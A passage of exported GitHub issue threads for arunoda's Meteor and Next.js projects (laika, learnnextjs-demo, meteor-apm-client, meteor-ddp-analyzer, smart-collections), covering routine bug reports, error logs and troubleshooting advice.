&gt; Reply to this email directly or view it on GitHubhttps://github.com/arunoda/laika/issues/114
&gt; .
</Body>
    </Comment>
  </Issue_63>
  <Issue_64>
    <Repository>laika</Repository>
    <Title>Where to put helper method?</Title>
    <Owner>arunoda</Owner>
    <Body>I tried to create a helper method out of test suite and I get this error:
`Uncaught ReferenceError: helperMethod is not defined`
</Body>
    <State>open</State>
    <Comment>
      <Owner>iansinnott</Owner>
      <Body>Try putting it anywhere in your `tests/` directory while omitting 'var': 

``` js
helperMethod = function() { /* Do stuff... */ };
```

Also check out this: https://github.com/zvictor/laika-extended-example

I'm not sure if there is a defined place for helpers, but this has been working for me by putting all helpers in `tests/setup.js`. The Laika documentation has _a lot_ of room for improvement with regards to extensibility.
</Body>
    </Comment>
  </Issue_64>
  <Issue_65>
    <Repository>laika</Repository>
    <Title>Support for Windows 7, 8</Title>
    <Owner>arunoda</Owner>
    <Body>This commit fixes #108
</Body>
    <State>open</State>
    <Comment>
      <Owner>shatting</Owner>
      <Body>thanks alot, together with https://github.com/alexscheelmeyer/node-phantom/issues/92 i finally got laika running! 
</Body>
    </Comment>
    <Comment>
      <Owner>andyp22</Owner>
      <Body>Thanks! I was having the same issue listed in https://github.com/arunoda/laika/issues/108 and this solution worked for me.
</Body>
    </Comment>
    <Comment>
      <Owner>Madsn</Owner>
      <Body>Think I'm having this problem as well. Why was this never merged back in 2014?
</Body>
    </Comment>
  </Issue_65>
  <Issue_66>
    <Repository>laika</Repository>
    <Title>Explain what done() does...</Title>
    <Owner>arunoda</Owner>
    <Body>...for users new to Meteor, without Node.js experience
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>good point. Can you please coin something for this?
</Body>
    </Comment>
  </Issue_66>
  <Issue_67>
    <Repository>laika</Repository>
    <Title>issue with coffeescript 1.7+</Title>
    <Owner>arunoda</Owner>
    <Body>If anyone else is having problems trying to get laika to work with coffeescript 1.7+, there is an issue with mocha.  You need to use
--compilers coffee:coffee-script/register

See visionmedia/mocha#1120
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Good one. Thanks.
</Body>
    </Comment>
    <Comment>
      <Owner>hamxiaoz</Owner>
      <Body>This fix for me. Maybe we should add 'how to support coffeescript' in the readme?
</Body>
    </Comment>
    <Comment>
      <Owner>noahadler</Owner>
      <Body>I'd love if Laika just picked up .coffee tests automatically
</Body>
    </Comment>
  </Issue_67>
  <Issue_68>
    <Repository>laika</Repository>
    <Title>How do you simulate clicks on elements?</Title>
    <Owner>arunoda</Owner>
    <Body>After I found that jQuery's `$.trigger()` doesn't work I did some googling and came up with a function like this:

```
clickElement = function(document, el) {
    var ev = document.createEvent("MouseEvent");
    ev.initMouseEvent(
        "click",
        true /* bubble */, true /* cancelable */,
        window, null,
        0, 0, 0, 0, /* coordinates */
        false, false, false, false, /* modifier keys */
        0 /*left*/, null
    );
    el.dispatchEvent(ev);
}
```

Is this an issue? Am I doing something completely wrong here?
If there's no other way to do this then a function like this should probably be shipped with laika. What do you think?
</Body>
    <State>open</State>
    <Comment>
      <Owner>lalomartins</Owner>
      <Body>I'm struggling with a similar issue here (need to test a file upload widget), I'm thinking instead we should expose more of the Phantom API. @arunoda what do you think?

Basically on the ClientConnector constructor, store the Phantom page object as this.page instead of a local variable, then we could use the full Phantom API. The one argument against is keeping Laika independent of Phantom&#8230; but for true end-to-end testing you need a browser API.

(Funny timing you bring this up now, I was _just_ writing that on a local branch!)
</Body>
    </Comment>
    <Comment>
      <Owner>blazer82</Owner>
      <Body>I like the idea of exposing phantom's page object...
</Body>
    </Comment>
    <Comment>
      <Owner>lalomartins</Owner>
      <Body>implemented in commit c78bae6, if this looks good to everyone I'll pull-request it

**edit**: I know this isn't &#8220;the github way&#8221;, I should just make the PR :smile_cat: but I don't want to split the conversation into yet another thread just yet until we're more or less in agreement
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>actually there seems to have no good alternative to phantomjs yet. So I'm fine with exposing the page object.
make sure to expose it with `_page`, so it is indicator that this is a private. You can use it, if you are pretty sure about it.
How about using `._phantomPage` instead?
</Body>
    </Comment>
  </Issue_68>
  <Issue_69>
    <Repository>laika</Repository>
    <Title>Laika does not exit if meteor project is not found</Title>
    <Owner>arunoda</Owner>
    <Body>Currently trying to get continuous integration to run properly on my local computer.
My machine is running Mac OSX 10.8

If I run the laika command in a folder that doesn't contain a meteor project (for example, if I misconfigured my CI configuration), laika will just hang on "loading phantomjs".

Edit:

I found this from your blog:

```
Replace test commands with following
METEOR_PATH=~/meteor laika -t 5000
```

The METEOR_PATH should be explained in the help.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yes.  Good Idea.

Laika should give some error if it is not inside a meteor folder. 

Yes. There are couple of other hidden features like `laika.opts` file, coffeescript support and so on.
Need to update the docs. And I'm planning to do a blog also with those new updates.

Thanks.
</Body>
    </Comment>
  </Issue_69>
  <Issue_70>
    <Repository>laika</Repository>
    <Title>Failed test (timeout) with example #2 in docs</Title>
    <Owner>arunoda</Owner>
    <Body>Looks like others have experienced this issue (http://stackoverflow.com/questions/17056068/meteorjs-laika-client-and-server-test-timout), namely:

Failure on test 2 of example 2 ("using both client and the server")

Error is "timeout of 2000ms exceeded"

I've tried suggested fixes in the SO question, including upgrading my Node.js version to no avail. Does anyone have a workaround? Otherwise, seems like a great test suite, please keep up the great work!
</Body>
    <State>open</State>
    <Comment>
      <Owner>ericraio</Owner>
      <Body>To add to this issue, 
I have also tried getting this to work but I can't figure out why it doesn't.

I still get this issue on both my Macbook Air and Macbook Pro
I have tried versions 0.10.4, 0.10.8, 0.10.10, 0.10.18

and all the versions return "Error: timeout of 2000ms exceeded"
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>There is another issues related to this. If your app loads somekind of images and css at load or some db initialisation. This could happens.
- Try running a server only, if that fails [increase timeout](http://arunoda.github.io/laika/options.html) time with -t
- If this works try running a client only test, if this also fails increase the timeout 
</Body>
    </Comment>
    <Comment>
      <Owner>zhaoyou</Owner>
      <Body>node.js `v0.10.22`
laika `v0.3.9`
meteor `v0.8.0.1`
os: `OS X 10.9.2`

@arunoda I create empty project, few css,image. laika -t big number.  it does't work.
</Body>
    </Comment>
  </Issue_70>
  <Issue_71>
    <Repository>laika</Repository>
    <Title>Using HTML reporter causes crash</Title>
    <Owner>arunoda</Owner>
    <Body>``` bash
laika -u bdd -R html

  injecting laika...
  loading phantomjs...
  loading initial app pool...
  cleaning up injected code


/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/node_modules/mocha/lib/reporters/html.js:194
    , div = document.createElement('div')
            ^
ReferenceError: document is not defined
    at fragment (/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/node_modules/mocha/lib/reporters/html.js:194:13)
    at new HTML (/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/node_modules/mocha/lib/reporters/html.js:51:14)
    at Mocha.run (/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/node_modules/mocha/lib/mocha.js:310:18)
    at AppPool.onAppPoolReady (/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/bin/_laika:91:26)
    at AppPool.EventEmitter.emit (events.js:92:17)
    at App.createInitialPool (/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/lib/app_pool.js:25:12)
    at App.EventEmitter.emit (events.js:95:17)
    at Socket.&lt;anonymous&gt; (/Users/carlodicelico/.nvm/v0.10.12/lib/node_modules/laika/lib/app.js:48:14)
    at Socket.EventEmitter.emit (events.js:117:20)
    at Socket.&lt;anonymous&gt; (_stream_readable.js:736:14)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yes. It is not working for somehow. Need to know why? 
I've never used it before.
</Body>
    </Comment>
  </Issue_71>
  <Issue_72>
    <Repository>laika</Repository>
    <Title>Better test creation tools</Title>
    <Owner>arunoda</Owner>
    <Body>Current eventEmitter based test creation api just work. But it bit hard to use and see. Solution for this is to give some better tools to write tests
- [x] evalSync(). support
- [x] actions support
- [ ] default set of useful actions
- [ ] documentation
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>related #5 
</Body>
    </Comment>
  </Issue_72>
  <Issue_73>
    <Repository>learnnextjs-demo</Repository>
    <Title>Fix for the three space indent on using-shared-components branch.</Title>
    <Owner>arunoda</Owner>
    <Body>Fixes:&#13;
&#13;
- Fix for the three space indent on using-shared-components branch.&#13;
- Update dependencies so typescript integration works&#13;
&#13;
Fixes based on [this](https://twitter.com/garybernhardt/status/1091783301323345920?s=21) feedback.</Body>
    <State>open</State>
    <Comment>
      <Owner>lucleray</Owner>
      <Body>Additionally to this PR, I think we should, **for each branch of the repo** :&#13;
- use prettier (.prettierrc)&#13;
- update dependencies</Body>
    </Comment>
    <Comment>
      <Owner>andersonleite</Owner>
      <Body>@lucleray I updated all the other branches for the newest next and react branches.&#13;
About prettierrc, if it's ok for you, I will look at it later.</Body>
    </Comment>
  </Issue_73>
  <Issue_74>
    <Repository>learnnextjs-demo</Repository>
    <Title>analyze in markdown-blog example does not work with next 5</Title>
    <Owner>arunoda</Owner>
    <Body>I followed the tutorial with a fresh install and encountered an error when it came to the `npm run analyze` command. After little investigation, I found that I get the same error after upgrading from next 4 to next 5.1.0.&#13;
&#13;
```&#13;
"C:\Program Files\JetBrains\IntelliJ IDEA 2017.3.2\bin\runnerw.exe" "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs\node_modules\npm\bin\npm-cli.js" run analyze --scripts-prepend-node-path=auto&#13;
&#13;
&gt; hello-next@1.0.0 analyze D:\dev\learnnextjs-demo&#13;
&gt; cross-env ANALYZE=1 next build&#13;
&#13;
Webpack Bundle Analyzer is started at http://127.0.0.1:8888&#13;
Use Ctrl+C to close it&#13;
events.js:137&#13;
      throw er; // Unhandled 'error' event&#13;
      ^&#13;
&#13;
Error: listen EADDRINUSE 127.0.0.1:8888&#13;
    at Object._errnoException (util.js:1003:13)&#13;
    at _exceptionWithHostPort (util.js:1024:20)&#13;
    at Server.setupListenHandle [as _listen2] (net.js:1366:14)&#13;
    at listenInCluster (net.js:1407:12)&#13;
    at doListen (net.js:1522:7)&#13;
    at process._tickCallback (internal/process/next_tick.js:152:19)&#13;
npm ERR! code ELIFECYCLE&#13;
npm ERR! errno 1&#13;
npm ERR! hello-next@1.0.0 analyze: `cross-env ANALYZE=1 next build`&#13;
npm ERR! Exit status 1&#13;
npm ERR! &#13;
npm ERR! Failed at the hello-next@1.0.0 analyze script.&#13;
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.&#13;
&#13;
npm ERR! A complete log of this run can be found in:&#13;
npm ERR!     D:\Cache\npm-cache\_logs\2018-03-29T16_40_48_888Z-debug.log&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>montionugera</Owner>
      <Body>&gt; Error: listen EADDRINUSE 127.0.0.1:8888&#13;
&#13;
Kill the application that uses the port 8888</Body>
    </Comment>
    <Comment>
      <Owner>zebxu</Owner>
      <Body>try to change the setting in `next.config.js` to&#13;
```javascript&#13;
new BundleAnalyzerPlugin({&#13;
          analyzerMode: 'server',&#13;
          analyzerPort: isServer ? 8888 : 8889,&#13;
          openAnalyzer: true&#13;
        })&#13;
````&#13;
add one more port in `analyzerPort`</Body>
    </Comment>
    <Comment>
      <Owner>stevaras</Owner>
      <Body>Happens to me as well. After a few seconds it crashes. &#13;
Nothing seems to run on the same port. &#13;
Changing port number didn't fix this. &#13;
&#13;
```&#13;
"dependencies": {&#13;
    "cross-env": "^5.0.1",&#13;
    "express": "^4.15.2",&#13;
    "firebase": "^5.7.0",&#13;
    "next": "^7.0.2",&#13;
    "react": "^16.2.0",&#13;
    "react-dom": "^16.2.0",&#13;
    "webpack-bundle-analyzer": "^3.0.3"&#13;
  }&#13;
&#13;
node: v11.4.0&#13;
npm: 6.4.1&#13;
```&#13;
&#13;
The complete log of this run: &#13;
&#13;
```&#13;
0 info it worked if it ends with ok&#13;
1 verbose cli [ '/usr/local/bin/node', '/usr/local/bin/npm', 'run', 'analyze' ]&#13;
2 info using npm@6.4.1&#13;
3 info using node@v11.4.0&#13;
4 verbose run-script [ 'preanalyze', 'analyze', 'postanalyze' ]&#13;
5 info lifecycle hello-next@1.0.0~preanalyze: hello-next@1.0.0&#13;
6 info lifecycle hello-next@1.0.0~analyze: hello-next@1.0.0&#13;
7 verbose lifecycle hello-next@1.0.0~analyze: unsafe-perm in lifecycle true&#13;
8 verbose lifecycle hello-next@1.0.0~analyze: PATH: /usr/local/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/home/stevaras/projects/nextjs/learnnextjs-demo/node_modules/.bin:/home/stevaras/anaconda2/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#13;
9 verbose lifecycle hello-next@1.0.0~analyze: CWD: /home/stevaras/projects/nextjs/learnnextjs-demo&#13;
10 silly lifecycle hello-next@1.0.0~analyze: Args: [ '-c', 'cross-env ANALYZE=1 next build' ]&#13;
11 silly lifecycle hello-next@1.0.0~analyze: Returned: code: 1  signal: null&#13;
12 info lifecycle hello-next@1.0.0~analyze: Failed to exec analyze script&#13;
13 verbose stack Error: hello-next@1.0.0 analyze: `cross-env ANALYZE=1 next build`&#13;
13 verbose stack Exit status 1&#13;
13 verbose stack     at EventEmitter.&lt;anonymous&gt; (/usr/local/lib/node_modules/npm/node_modules/npm-lifecycle/index.js:301:16)&#13;
13 verbose stack     at EventEmitter.emit (events.js:189:13)&#13;
13 verbose stack     at ChildProcess.&lt;anonymous&gt; (/usr/local/lib/node_modules/npm/node_modules/npm-lifecycle/lib/spawn.js:55:14)&#13;
13 verbose stack     at ChildProcess.emit (events.js:189:13)&#13;
13 verbose stack     at maybeClose (internal/child_process.js:978:16)&#13;
13 verbose stack     at Process.ChildProcess._handle.onexit (internal/child_process.js:265:5)&#13;
14 verbose pkgid hello-next@1.0.0&#13;
15 verbose cwd /home/stevaras/projects/nextjs/learnnextjs-demo&#13;
16 verbose Linux 4.15.0-42-generic&#13;
17 verbose argv "/usr/local/bin/node" "/usr/local/bin/npm" "run" "analyze"&#13;
18 verbose node v11.4.0&#13;
19 verbose npm  v6.4.1&#13;
20 error code ELIFECYCLE&#13;
21 error errno 1&#13;
22 error hello-next@1.0.0 analyze: `cross-env ANALYZE=1 next build`&#13;
22 error Exit status 1&#13;
23 error Failed at the hello-next@1.0.0 analyze script.&#13;
23 error This is probably not a problem with npm. There is likely additional logging output above.&#13;
24 verbose exit [ 1, true ]&#13;
&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>Ishino</Owner>
      <Body>running into the same issue&#13;
&#13;
```0 info it worked if it ends with ok&#13;
1 verbose cli [ '/usr/local/Cellar/node@8/8.12.0/bin/node',&#13;
1 verbose cli   '/usr/local/opt/node@8/bin/npm',&#13;
1 verbose cli   'run',&#13;
1 verbose cli   'analyze' ]&#13;
2 info using npm@6.4.1&#13;
3 info using node@v8.12.0&#13;
4 verbose run-script [ 'preanalyze', 'analyze', 'postanalyze' ]&#13;
5 info lifecycle hello-next@1.0.0~preanalyze: hello-next@1.0.0&#13;
6 info lifecycle hello-next@1.0.0~analyze: hello-next@1.0.0&#13;
7 verbose lifecycle hello-next@1.0.0~analyze: unsafe-perm in lifecycle true&#13;
8 verbose lifecycle hello-next@1.0.0~analyze: PATH: /usr/local/Cellar/node@8/8.12.0/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/Users/dries/learnnextjs-demo/node_modules/.bin:/Users/dries/google-cloud-sdk/bin:/usr/local/opt/node@8/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/share/dotnet:~/.dotnet/tools&#13;
9 verbose lifecycle hello-next@1.0.0~analyze: CWD: /Users/dries/learnnextjs-demo&#13;
10 silly lifecycle hello-next@1.0.0~analyze: Args: [ '-c', 'cross-env ANALYZE=1 next build' ]&#13;
11 silly lifecycle hello-next@1.0.0~analyze: Returned: code: 1  signal: null&#13;
12 info lifecycle hello-next@1.0.0~analyze: Failed to exec analyze script&#13;
13 verbose stack Error: hello-next@1.0.0 analyze: `cross-env ANALYZE=1 next build`&#13;
13 verbose stack Exit status 1&#13;
13 verbose stack     at EventEmitter.&lt;anonymous&gt; (/usr/local/Cellar/node@8/8.12.0/lib/node_modules/npm/node_modules/npm-lifecycle/index.js:301:16)&#13;
13 verbose stack     at emitTwo (events.js:126:13)&#13;
13 verbose stack     at EventEmitter.emit (events.js:214:7)&#13;
13 verbose stack     at ChildProcess.&lt;anonymous&gt; (/usr/local/Cellar/node@8/8.12.0/lib/node_modules/npm/node_modules/npm-lifecycle/lib/spawn.js:55:14)&#13;
13 verbose stack     at emitTwo (events.js:126:13)&#13;
13 verbose stack     at ChildProcess.emit (events.js:214:7)&#13;
13 verbose stack     at maybeClose (internal/child_process.js:915:16)&#13;
13 verbose stack     at Process.ChildProcess._handle.onexit (internal/child_process.js:209:5)&#13;
14 verbose pkgid hello-next@1.0.0&#13;
15 verbose cwd /Users/dries/learnnextjs-demo&#13;
16 verbose Darwin 18.2.0&#13;
17 verbose argv "/usr/local/Cellar/node@8/8.12.0/bin/node" "/usr/local/opt/node@8/bin/npm" "run" "analyze"&#13;
18 verbose node v8.12.0&#13;
19 verbose npm  v6.4.1&#13;
20 error code ELIFECYCLE&#13;
21 error errno 1&#13;
22 error hello-next@1.0.0 analyze: `cross-env ANALYZE=1 next build`&#13;
22 error Exit status 1&#13;
23 error Failed at the hello-next@1.0.0 analyze script.&#13;
23 error This is probably not a problem with npm. There is likely additional logging output above.&#13;
24 verbose exit [ 1, true ]```</Body>
    </Comment>
    <Comment>
      <Owner>FabienSalles</Owner>
      <Body>I don't understand the problem but I fixed the issue by modified the config option : &#13;
``new BundleAnalyzerPlugin({analyzerMode: 'static'})``</Body>
    </Comment>
  </Issue_74>
  <Issue_75>
    <Repository>learnnextjs-demo</Repository>
    <Title>pretty url with server side rendering?</Title>
    <Owner>arunoda</Owner>
    <Body>In the demo of this tutorial https://learnnextjs.com/basics/fetching-data-for-pages there's no way to change the url to be string like `localhost:3000/p/batman-vs-superman` instead of `http://localhost:3000/p/123` ? &#13;
&#13;
In the previous tutorial before that, the doc throws an open question without a solution&#13;
&#13;
This is a problem. But in the real world, this won't be much of an issue because we'll use an ID to fetch data from a data server in both client and the server.&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>main-uddin</Owner>
      <Body>Yes, that's very confusing.</Body>
    </Comment>
  </Issue_75>
  <Issue_76>
    <Repository>learnnextjs-demo</Repository>
    <Title>The answer of the first question of the Creating Dynamic Pages may be multiple</Title>
    <Owner>arunoda</Owner>
    <Body>I runned the app of this lesson (I'm rendering on Vivaldi browser) and when I checked the answer "/post?title=Hello Next.js", it's show that I'm wrong, but the URL on the browser show me this value.&#13;
I repeat the test on Google Chrome browser and the URL show me "post?title=Hello%20Next.js".&#13;
&#13;
I think the both of this answers may be correct.</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>That's a good one. Currently, we've no way to accept two correct answers. Let's schedule it as a feature.</Body>
    </Comment>
    <Comment>
      <Owner>tomas2387</Owner>
      <Body>Or just add a warning saying that if we use Firefox or Vivaldi the answer might be different.&#13;
(yes, it happens in Firefox too)&#13;
&#13;
</Body>
    </Comment>
  </Issue_76>
  <Issue_77>
    <Repository>learnnextjs-demo</Repository>
    <Title>Doesn't work without a react import</Title>
    <Owner>arunoda</Owner>
    <Body>This file and the learnnextjs.com tutorial don't seem to use any import of react.&#13;
However if I run it this way a 'React is not defined' error appears.&#13;
&#13;
I can solve this by putting the following line at the start of the file. &#13;
`import React from 'react';`&#13;
&#13;
Am I doing something wrong that this is needed?</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>That's weird.&#13;
But this only works if you've used stateless functional components.&#13;
If you are extending from React.Component, you need to import it.</Body>
    </Comment>
  </Issue_77>
  <Issue_78>
    <Repository>meteor-apm-client</Repository>
    <Title>Package compatibility for arunoda:apm with Meteor 1.1 for Windows</Title>
    <Owner>arunoda</Owner>
    <Body>Hi!

This package has binary dependencies, and we wanted to give you a heads up that Meteor 1.1, with support for Windows will be released in a few days.

Now is the time to publish your package for Windows!

It should be very straightforward -- we've added new build machines that run Windows that you can access with the `meteor admin get-machine` command. This is the same as you've done before for the other architectures we support.

For complete directions on how to publish your package for Windows, visit https://github.com/meteor/meteor/wiki/Publishing-a-package-with-binary-dependencies-for-the-Windows-preview

On behalf of the Meteor team,
@stubailo, @Slava and @avital.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hey, this package is not maintaining.
But, I know some other packages. I'll publish them today.
</Body>
    </Comment>
  </Issue_78>
  <Issue_79>
    <Repository>meteor-apm-client</Repository>
    <Title>Response time discrepancy on chart vs. trace</Title>
    <Owner>arunoda</Owner>
    <Body>In [this video](http://screencast.com/t/X7PRuljgRP), a traced subscription looks like it took about 2 seconds on the chart, but the trace shows 7 seconds (which is closer to reality).
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>What you are seeing is the subscription with maximum ResponseTime.
There might be some other subscription for this publication which is lower
than this value.

---

Arunoda Susiripala
I curate Meteor Weekly - Check it
out!http://meteorhacks.com/meteor-weekly/?utm_source=email-footer&amp;utm_medium=email&amp;utm_campaign=meteorweekly

On Mon, May 19, 2014 at 8:44 PM, Dan Dascalescu notifications@github.comwrote:

&gt; In this video http://screencast.com/t/X7PRuljgRP, a traced subscription
&gt; looks like it took about 2 seconds on the chart, but the trace shows 7
&gt; seconds (which is closer to reality).
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/arunoda/meteor-apm-client/issues/44
&gt; .
</Body>
    </Comment>
    <Comment>
      <Owner>dandv</Owner>
      <Body>Does the top of the line in the chart (the time series point) represent the _average_ of subscription times?

Therefore if more than one trace is represented under that time series point, the user will see trace times higher and lower than the one in the chart?
</Body>
    </Comment>
  </Issue_79>
  <Issue_80>
    <Repository>meteor-apm-client</Repository>
    <Title>Logout doesn't immediately reroute to home page</Title>
    <Owner>arunoda</Owner>
    <Body>Instead I get `Uncaught Error: Unauthorized access to appId: &lt;...&gt; [401]` after I click Logout.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yes dan, 

You've been logged out. You need to refresh browser to logged in again.
We are working on a fix.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>We've added a fix now. 
Still you'll see some errors, please avoid them. 

It gets simply, we cannot clean some resources when you logging out from the the app.

Meteor currently does not have an event when the user logs out. We'll work on this again when we are implementing the new custom UI window.
</Body>
    </Comment>
    <Comment>
      <Owner>dandv</Owner>
      <Body>Thanks Arunoda. Just wanted to get this filed as an issue. Will patiently await for a fix.
</Body>
    </Comment>
  </Issue_80>
  <Issue_81>
    <Repository>meteor-apm-client</Repository>
    <Title>User/pass can't be remembered by browser</Title>
    <Owner>arunoda</Owner>
    <Body>Chrome doesn't offer to remember the user/pass after I login. Is this an upstream issue with accounts-ui perhaps?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>I think, that's because of the single page behaviour. Not sure how chrome detects that anyway.
</Body>
    </Comment>
  </Issue_81>
  <Issue_82>
    <Repository>meteor-ddp-analyzer</Repository>
    <Title>Compatible with the latest meteor version?</Title>
    <Owner>arunoda</Owner>
    <Body>@arunoda is this package still compatible with meteor?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yes. It works.
Have you got any issues?
</Body>
    </Comment>
    <Comment>
      <Owner>ghost</Owner>
      <Body>I have a slight problem after using, my app just wouldn't load as usual. Not unless i have ddp-analyzer-proxy running. 

info?cb=xzojur0wpk
/sockjs

(failed)
net::ERR_CONNECTION_REFUSED

Method
GET

Type
xhr

Initiator
sockjs-0.3.4.js:854
Script
</Body>
    </Comment>
  </Issue_82>
  <Issue_83>
    <Repository>meteor-ddp-analyzer</Repository>
    <Title>how to connect from non localhost app</Title>
    <Owner>arunoda</Owner>
    <Body>Hi Arunoda, 
Thanks for providing this tool. 
I'm having some issues when trying to connect to the server from a "remote" client, or a client that doesn't reside on the localhost.
In the specific I'm trying to connect via an Android device using the android-ddp library.

I'm sure my device does connect to the server, since I do receive the data, but no messages are displayed in the ddp analyzer. I also know that the ddp analyzer is working because if I connect from the local meteor app, the ddp analyzer does show the ddp messages in the console.

I'm trying to connect from my android device both via the main meteor port 192.168.0.101:3000 and the proxied port 192.168.0.101:3030 but none work to show the messages.

I've made sure that the Android device is the ONLY client trying to connect to the server as you suggest in your article...but even that didn't help.

Do you have any idea on how to see ddp messages of a client that is not on the localhost?
Thanks in advance
cheers
b.
</Body>
    <State>open</State>
    <Comment>
      <Owner>lyricalpolymath</Owner>
      <Body>Partially solved it.

assuming your local machine has ip 192.168.0.101
you should

```
$ export DDP_DEFAULT_CONNECTION_URL=http://192.168.0.101:3030
```

and then from your other client connect to the server 192.168.0.101 on the default port 3000

This allows for example from an incognito tab in chrome or any browser in a phone connected to the local wifi network to successfully connect to http://192.168.0.101:3000 and the ddp-analyzer would work fine...but it doesn't if I connect from a native Android app (although I do receive the data inside the app)

I've seen this other closed issue https://github.com/arunoda/meteor-ddp-analyzer/issues/5 but I'm not sure if ti does actually fit my need

any ideas?? the thing is that ddp-analyzer is actually working but only for a subset of clients.

On a side note, I think you should include in the README a reminder to reset the variable when you're done with the ddp analyzer or your normal meteor won't work

```
$ export DDP_DEFAULT_CONNECTION_URL=http://localhost:3000
```
</Body>
    </Comment>
    <Comment>
      <Owner>fugufisch</Owner>
      <Body>Any news? I have the exact same problem with a native android app.
</Body>
    </Comment>
  </Issue_83>
  <Issue_84>
    <Repository>meteor-smart-collections</Repository>
    <Title>find query is not working while using Meteor smart Collections</Title>
    <Owner>arunoda</Owner>
    <Body>Hey there!

I am using the lates version of smart-collections and want to test it.

I read the "documentation" of this package - maybe i need a sample - but in my case it does not work.

First what i did:

app/collections/collections.js

MyCollection = new SmartCollection('Test');
app/server/publishs.js

Meteor.publish('test', function(){
     return MyCollection.find();
});
app/client/env.js

Meteor.subscribe('test');
Error output (shorted):

Exception from sub STxdGoBM293NARNGe TypeError: Object function (name) {                                                                   // 10
I20140603-00:24:41.299(2)?   var self = this;                                                                                    // 11
I20140603-00:24:41.300(2)?   self.name = name;                                                                                   // 12
I20140603-00:24:41.300(2)?   // _id -&gt; document (also containing id)                                                             // 13
I20140603-00:24:41.300(2)?   self._docs = new LocalCollection._IdMap;                                                            // 14
I20140603-00:24:41.301(2)?                                                                                                       // 15
I20140603-00:24:41.302(2)?   self._observeQueue = new Meteor._SynchronousQueue();                                                // 16
When I remove the subscribtion no error is shown. When i change my SmartCollection to Collection the but do not remove the subscribtion the error is also not shown.
</Body>
    <State>open</State>
    <Comment>
      <Owner>TimoRuetten</Owner>
      <Body>@anupnitkkr It seems that the project is deprecated - as it says at the readme: "Smart Collection is now retired &amp; Meteor's Collection implementation has fixes for most of the performance bottlenecks."

So just use the default Meteor way for Collections.
</Body>
    </Comment>
    <Comment>
      <Owner>anupnitkkr</Owner>
      <Body>@TimoRuetten  : Currently I am using Default Meteor way . for performance  . I was thinking that  smart-collection can reduce long polling for pub/sub   .  If you have any solution , Can you tell me 
</Body>
    </Comment>
    <Comment>
      <Owner>TimoRuetten</Owner>
      <Body>@anupnitkkr SmartCollection will not boost the Collections in Meteor anymore. You have to remove the SmartCollection package because what SmartCollection has done to boost is Meteor doing now by itself.
</Body>
    </Comment>
  </Issue_84>
  <Issue_85>
    <Repository>meteor-smart-collections</Repository>
    <Title>update return error and affected count undefined</Title>
    <Owner>arunoda</Owner>
    <Body>i try to update collection with Meteor.Collection ( even with async callback function ) , the return error and count is correct always.
but when i replace Meteor.Collection with Meteor.SmartCollection . all return value change to 'undefined' . what can i do ? or this is bug ?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Can you demonstrate this with a sample code. Then I can get a better understanding of the issue.
</Body>
    </Comment>
    <Comment>
      <Owner>rodmanlu</Owner>
      <Body>case 1 sync ( n1 is undefined with Smart Collection):
n1 = stkbasic.update({ _id: stk._id }, { $set: one } );  
console.log('update id: ' + stk.code + ' - ' + n1 );

case 2 sync ( n2 is undefined with Smart Collection):
up={};
up['y']=year;
up[fld]=val;
n2 = stkbasic.update( { _id: stkId }, { $addToSet : { years : up } });
console.log('update n2:' + n2);

case 3 async ( err and count are undefined with Smart Collection):
stkbasic.update( { _id: stkId, month: {$elemMatch: { m : d } }  }, { $set :  u }, 
                                  function(err, count){

```
                                 console.log('count:' + count + ', err:' + err);    

                              } );
```
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Not I got the issue. Yes it is undefined. It's not a bug simply I forgot to implement it.
Will do it.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Okay, I've released a new version(`0.3.23`) 
It has the fix.
</Body>
    </Comment>
    <Comment>
      <Owner>rodmanlu</Owner>
      <Body>thanks. but the version 0.3.23 worked when update successfully.
still return undefined if update fail not value 0 
</Body>
    </Comment>
  </Issue_85>
  <Issue_86>
    <Repository>meteor-streams</Repository>
    <Title>Your app is crashing. Here's the latest log.</Title>
    <Owner>arunoda</Owner>
    <Body>Homepage-Example: Your app is crashing. Here's the latest log.

/Applications/MAMP/htdocs/frequentis/ms-homepage/.meteor/local/build/server/server.js:337
  }).run();
     ^
TypeError: undefined is not a function
    at app/server-to-client.js:1:32
